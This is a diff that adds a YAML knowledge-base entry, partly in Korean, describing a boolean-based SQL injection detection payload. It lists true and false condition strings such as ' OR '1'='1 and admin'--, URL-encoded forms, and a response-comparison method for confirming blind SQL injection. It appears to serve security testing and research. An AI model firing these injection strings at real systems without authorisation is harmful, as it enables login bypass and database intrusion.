@@ -1,0 +1,136 @@
+# GR-SEC-INS-P0002: Boolean-based Detection Payload
+
+identity:
+  id: GR-SEC-INS-P0002
+  name: "Boolean True/False Detection Payload"
+  normalization:
+    normalized_name: "boolean true false detection payload"
+    normalization_version: "1.0"
+  aliases:
+    - "Tautology Test"
+    - "OR 1=1 Test"
+    - "Boolean SQLi Probe"
+
+classification:
+  domain: security
+  type: payload
+  abstraction_level: 1
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-DETECT"
+
+definition:
+  what: |
+    항상 참(1=1)과 항상 거짓(1=2) 조건을 비교하여
+    SQL Injection 취약점을 탐지하는 페이로드 쌍이다.
+    두 응답의 차이로 Blind SQLi 가능성을 판단한다.
+  why: |
+    에러 메시지가 표시되지 않아도 참/거짓 조건에 따른
+    응답 차이를 관찰할 수 있다면 Boolean-based Blind
+    SQLi가 가능하다.
+
+payload:
+  true_condition:
+    raw: "' OR '1'='1"
+    variations:
+      - "' OR '1'='1"
+      - "\" OR \"1\"=\"1"
+      - "' OR 1=1--"
+      - "' OR 1=1#"
+      - "') OR ('1'='1"
+      - "1' OR '1'='1' --"
+      - "admin'--"
+  false_condition:
+    raw: "' AND '1'='2"
+    variations:
+      - "' AND '1'='2"
+      - "' AND 1=2--"
+      - "' AND 1=2#"
+      - "') AND ('1'='2"
+  encoded:
+    url_true: "%27%20OR%20%271%27%3D%271"
+    url_false: "%27%20AND%20%271%27%3D%272"
+
+detection:
+  method: differential_analysis
+  indicators:
+    true_response:
+      - content_present: "expected data visible"
+      - status_code: 200
+      - content_length: "larger"
+    false_response:
+      - content_absent: "expected data missing"
+      - status_code: [200, 404]
+      - content_length: "smaller"
+    vulnerability_confirmed:
+      - condition: "true_response != false_response"
+        confidence: 0.85
+
+relations:
+  structural:
+    instance_of:
+      - GR-SEC-TEC-00002  # Boolean-based SQLi
+  conditional:
+    preceded_by:
+      - GR-SEC-INS-P0001  # Quote test
+    followed_by:
+      - GR-SEC-INS-P0010  # Data extraction payload
+
+constraints:
+  - property: effectiveness
+    base_value: 0.85
+    conditions:
+      - when:
+          context_type: response
+          condition: "no_observable_difference == true"
+        then:
+          value: 0.0
+          reason: "응답 차이가 없으면 Boolean 탐지 불가"
+
+properties:
+  security:
+    severity: info
+    purpose: detection
+    false_positive_rate: low
+    requires_comparison: true
+    dbms_universal: true
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: manual
+      source_uri: "internal://gr-sqli-payloads"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_authoring"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: low
+  ai:
+    embedding_text: |
+      Boolean True/False Detection Payload는 OR 1=1(참)과
+      AND 1=2(거짓) 조건을 비교하여 SQLi를 탐지한다.
+      두 응답의 차이(내용, 길이, 상태 코드)로 Blind SQLi
+      가능성을 확인한다. 에러 메시지 없이도 동작하며
+      Boolean-based 공격의 전제 조건을 검증한다.
+    search_keywords:
+      - "OR 1=1"
+      - "Boolean test"
+      - "tautology"
+      - "true false"
+      - "blind detection"
